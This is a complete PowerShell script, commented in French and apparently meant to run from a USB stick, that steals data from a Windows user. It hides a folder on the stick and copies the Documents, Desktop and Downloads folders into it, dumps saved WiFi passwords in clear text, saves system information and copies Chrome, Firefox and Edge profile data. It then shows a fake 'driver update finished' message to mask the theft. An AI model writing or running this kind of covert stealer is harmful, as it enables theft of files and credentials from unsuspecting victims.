# payload.ps1
# Script PowerShell pour extraire des données sensibles vers la clé USB

# Créer dossier caché sur la clé USB
$usbPath = (Get-Location).Path
$dataPath = Join-Path $usbPath "SystemFiles"

# Vérification de l'existence du dossier
if (-not (Test-Path $dataPath)) {
    New-Item -ItemType Directory -Force -Path $dataPath | Out-Null
    attrib +h $dataPath
} else {
    Write-Host "Le dossier $dataPath existe déjà."
}

# Copier les dossiers Documents et Desktop
$targets = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads"   # Dossier des téléchargements
)

foreach ($target in $targets) {
    if (Test-Path $target) {
        $destination = Join-Path $dataPath (Split-Path $target -Leaf)
        # Vérifier si le dossier de destination existe, sinon le créer
        if (-not (Test-Path $destination)) {
            New-Item -ItemType Directory -Path $destination -Force | Out-Null
        }
        robocopy $target $destination /E /Z /XA:H /W:1 /R:1
        Write-Host "Les fichiers de $target ont été copiés vers $destination."
    } else {
        Write-Host "Le dossier $target n'existe pas, saut de la copie."
    }
}

# Récupérer les mots de passe WiFi
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}
foreach ($profile in $wifiProfiles) {
    try {
        $wifiData = netsh wlan show profile name="$profile" key=clear
        $wifiFile = Join-Path $dataPath "wifi_$profile.txt"
        $wifiData | Out-File -FilePath $wifiFile -Force
        Write-Host "Les informations WiFi de '$profile' ont été enregistrées dans $wifiFile."
    } catch {
        Write-Host "Erreur lors de l'extraction des informations WiFi pour le profil '$profile'."
    }
}

# Infos système de base
$systemInfoFile = Join-Path $dataPath "system_info.txt"
try {
    Get-ComputerInfo | Out-File -FilePath $systemInfoFile -Force
    Write-Host "Les informations système ont été enregistrées dans $systemInfoFile."
} catch {
    Write-Host "Erreur lors de l'extraction des informations système."
}

# Extraire les données des navigateurs
# Vérification et copie des données pour Chrome
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDataPath) {
    $chromeDest = Join-Path $dataPath "Chrome"
    if (-not (Test-Path $chromeDest)) {
        New-Item -ItemType Directory -Path $chromeDest -Force | Out-Null
    }
    robocopy $chromeDataPath $chromeDest /E /Z /XA:H /W:1 /R:1
    Write-Host "Les données de Chrome ont été copiées dans $chromeDest."
} else {
    Write-Host "Le dossier Chrome n'existe pas, saut de la copie."
}

# Vérification et copie des données pour Firefox
$firefoxDataPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxDataPath) {
    $firefoxDest = Join-Path $dataPath "Firefox"
    if (-not (Test-Path $firefoxDest)) {
        New-Item -ItemType Directory -Path $firefoxDest -Force | Out-Null
    }
    robocopy $firefoxDataPath $firefoxDest /E /Z /XA:H /W:1 /R:1
    Write-Host "Les données de Firefox ont été copiées dans $firefoxDest."
} else {
    Write-Host "Le dossier Firefox n'existe pas, saut de la copie."
}

# Vérification et copie des données pour Edge
$edgeDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDataPath) {
    $edgeDest = Join-Path $dataPath "Edge"
    if (-not (Test-Path $edgeDest)) {
        New-Item -ItemType Directory -Path $edgeDest -Force | Out-Null
    }
    robocopy $edgeDataPath $edgeDest /E /Z /XA:H /W:1 /R:1
    Write-Host "Les données de Edge ont été copiées dans $edgeDest."
} else {
    Write-Host "Le dossier Edge n'existe pas, saut de la copie."
}

# Facultatif : signaler fin de travail
[System.Windows.Forms.MessageBox]::Show('Mise à jour des drivers terminée.', 'Pilote USB', 64)

exit
